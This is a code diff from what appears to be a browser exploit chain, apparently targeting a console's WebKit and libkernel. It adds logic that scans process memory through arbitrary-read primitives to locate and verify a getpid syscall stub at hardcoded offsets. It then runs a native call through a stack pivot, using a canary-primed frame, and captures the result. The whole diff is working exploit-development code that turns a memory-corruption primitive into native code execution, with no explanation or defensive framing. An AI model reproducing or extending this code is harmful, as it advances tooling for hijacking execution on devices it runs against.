@@ -5,8 +5,10 @@ import { int64 } from "./int64.js";
 import {
     prepNativeChain, firePivotGetpid, fireNativeCall,
     stageNotify, fireNotifyDevWrite, bisectDisarmG0, bisectRestorePivotOnly,
-} from "./native_call.js?v=nc-20250901f";
+    primeCallFrame, readCallRetDetailed,
+} from "./native_call.js?v=nc-20250901g";
 import { captureParseIntMainMf, loadStubCap } from "./stub_call.js?v=stub-7";
+import { isGetpidStubAt, resolveGetpidStub } from "./libkernel_resolve.js";
 
 let g0Prep = null;
 const SS_G0_FIRED = "wk-g0-fired";
@@ -16,16 +18,36 @@ export function nativeRetOk(ret) {
     return ret === 0;
 }
 
+const GETPID_FRAME_CANARY = 0xCAFEBABE;
+
+function peekStubWord(p, lk, stubOff) {
+    try {
+        const w = p.read4(lk.add32(stubOff));
+        return w == null ? "?" : "0x" + (w >>> 0).toString(16);
+    } catch (_) {
+        return "?";
+    }
+}
+
+function pushStubCand(list, seen, stubOff, tag, mode, verified) {
+    if (stubOff == null || stubOff < 0) return;
+    const key = stubOff >>> 0;
+    if (seen[key]) return;
+    seen[key] = true;
+    list.push({ stubOff: key, tag, mode: mode || "raw", verified: !!verified });
+}
+
 /**
- * getpid stub — default raw syscall @ lk+k_getpid_syscall (rax = PID).
- * ?getpid=wrap → BillZai wrapper @ k_stubs[20] (legacy ret=0 “OK”).
+ * getpid stub — default auto (verify syscall bytes @ lk).
+ * ?getpid=raw — blind lk+0x4fa · wrap — lk+0x2cb70 · scan — sparse hunt
  */
-export function resolveG0GetpidStubOff(off, opts) {
+export function resolveG0GetpidStubOff(p, lk, off, opts) {
     opts = opts || {};
     const q = opts.getpidMode
         || (typeof location !== "undefined"
             ? new URLSearchParams(location.search).get("getpid") : null)
-        || "raw";
+        || "auto";
+
     if (q === "wrap" || q === "stub20" || q === "billzai") {
         const stubOff = (off.k_stubs && off.k_stubs[20] != null)
             ? off.k_stubs[20] : 0x2cb70;
@@ -33,13 +55,78 @@ export function resolveG0GetpidStubOff(off, opts) {
             stubOff,
             mode: "wrap",
             tag: "wrap+0x" + stubOff.toString(16),
+            verified: false,
+            peek: p && lk ? peekStubWord(p, lk, stubOff) : null,
         };
     }
-    const stubOff = off.k_getpid_syscall != null ? off.k_getpid_syscall : 0x4fa;
+
+    if (q === "raw") {
+        const stubOff = off.k_getpid_syscall != null ? off.k_getpid_syscall : 0x4fa;
+        return {
+            stubOff,
+            mode: "raw",
+            tag: "syscall+0x" + stubOff.toString(16),
+            verified: false,
+            peek: p && lk ? peekStubWord(p, lk, stubOff) : null,
+        };
+    }
+
+    const cands = [];
+    const seen = {};
+    const sc = off.k_getpid_syscall != null ? off.k_getpid_syscall : 0x4fa;
+    pushStubCand(cands, seen, sc, "syscall+0x" + sc.toString(16), "raw", false);
+    pushStubCand(cands, seen, sc - 0xa, "syscall+0x" + (sc - 0xa).toString(16), "raw", false);
+    if (off.k_stubs && off.k_stubs[20] != null)
+        pushStubCand(cands, seen, off.k_stubs[20],
+            "wrap-cand+0x" + off.k_stubs[20].toString(16), "raw", false);
+
+    if (p && lk) {
+        for (let i = 0; i < cands.length; i++) {
+            const c = cands[i];
+            if (isGetpidStubAt(p, lk.add32(c.stubOff))) {
+                return {
+                    stubOff: c.stubOff,
+                    mode: "raw",
+                    tag: "verified-" + c.tag,
+                    verified: true,
+                    peek: peekStubWord(p, lk, c.stubOff),
+                };
+            }
+        }
+        if (q === "auto" || q === "scan") {
+            const hit = resolveGetpidStub(p, lk, off, {
+                maxProbes: q === "scan" ? 512 : 96,
+                fnProbes: 0,
+                skipLkOffs: false,
+            });
+            if (hit.verified && hit.off != null) {
+                return {
+                    stubOff: hit.off,
+                    mode: "raw",
+                    tag: "scan-" + (hit.tag || ("+0x" + hit.off.toString(16))),
+                    verified: true,
+                    peek: peekStubWord(p, lk, hit.off),
+                };
+            }
+        }
+        if (off.k_stubs && off.k_stubs[20] != null) {
+            const woff = off.k_stubs[20];
+            return {
+                stubOff: woff,
+                mode: "raw",
+                tag: "fallback-wrap-cand+0x" + woff.toString(16),
+                verified: false,
+                peek: peekStubWord(p, lk, woff),
+            };
+        }
+    }
+
     return {
-        stubOff,
+        stubOff: sc,
         mode: "raw",
-        tag: "syscall+0x" + stubOff.toString(16),
+        tag: "blind-syscall+0x" + sc.toString(16),
+        verified: false,
+        peek: null,
     };
 }
 
@@ -204,38 +291,55 @@ export function fireG0Smoke(p, off, opts) {
     return { path: "g0-smoke", cap };
 }
 
-/** G0 + cell30 hook + getpid — default raw syscall (want pid > 0 in rax). */
+/** G0 + cell30 hook + getpid — auto-verified syscall (want pid > 0). */
 export function fireG0Getpid(p, off, lk, opts) {
     opts = opts || {};
     if (!lk) throw new Error("g0 getpid: need lk");
     if (g0AlreadyFired() && !opts.allowRefire)
         throw new Error("g0: already fired — reload tab before refire");
     const prep = ensureG0Prep(p, off, lk, opts);
-    const stub = resolveG0GetpidStubOff(off, opts);
-    stubStep(opts, "G0-GETPID-FIRE", stub.tag + " lk=" + lk
-        + (stub.mode === "raw" ? " (want pid>0)" : " (wrap ret=0)"));
+    const stub = resolveG0GetpidStubOff(p, lk, off, opts);
+    stubStep(opts, "G0-GETPID-STUB", stub.tag
+        + (stub.verified ? " VERIFIED" : " UNVERIFIED")
+        + (stub.peek ? " peek=" + stub.peek : "")
+        + " lk=" + lk);
+    stubStep(opts, "G0-GETPID-FIRE", stub.mode === "raw"
+        ? "want pid>0 @ +0x" + stub.stubOff.toString(16)
+        : "wrap want ret=0");
+    primeCallFrame(p, prep, GETPID_FRAME_CANARY);
     const ret = firePivotGetpid(p, prep, lk, off, stub.stubOff, {
         hook: opts.hook || "cell30",
         carrier: opts.carrier || null,
         skipVerify: opts.skipVerify === true,
     });
+    const cap = readCallRetDetailed(p, prep);
+    const got = cap.ret;
+    const storeMiss = (got === 0 && cap.memLo === GETPID_FRAME_CANARY);
+    stubStep(opts, "GETPID-CAP",
+        "ret=" + got + " dv=0x" + cap.dvLo.toString(16)
+        + " mem=0x" + cap.memLo.toString(16)
+        + (storeMiss ? " STORE-MISS" : ""));
     postFireCleanup(p, prep, opts);
     markG0Fired("getpid");
-    const ok = getpidRetOk(ret, stub.mode);
+    const ok = getpidRetOk(got, stub.mode);
     const doneDetail = stub.mode === "raw"
-        ? "pid=" + ret + (ok ? " OK" : " BAD")
-        : "wrap-ret=" + ret + (ok ? " OK" : " fail");
+        ? "pid=" + got + (ok ? " OK" : " BAD")
+        + (storeMiss ? " (frame not stored?)" : "")
+        : "wrap-ret=" + got + (ok ? " OK" : " fail");
     stubStep(opts, "G0-DONE", doneDetail);
     try {
         sessionStorage.setItem("wk-native-getpid-ok",
-            (stub.mode === "raw" ? "pid=" : "wrap=") + ret + "@" + Date.now());
+            (stub.mode === "raw" ? "pid=" : "wrap=") + got + "@" + Date.now());
     } catch (_) { }
     return {
         path: "g0-getpid",
-        ret,
-        pid: stub.mode === "raw" ? ret : null,
+        ret: got,
+        pid: stub.mode === "raw" ? got : null,
         mode: stub.mode,
         stubOff: stub.stubOff,
+        verified: stub.verified,
+        capture: cap,
+        storeMiss,
         ok,
         prep,
     };
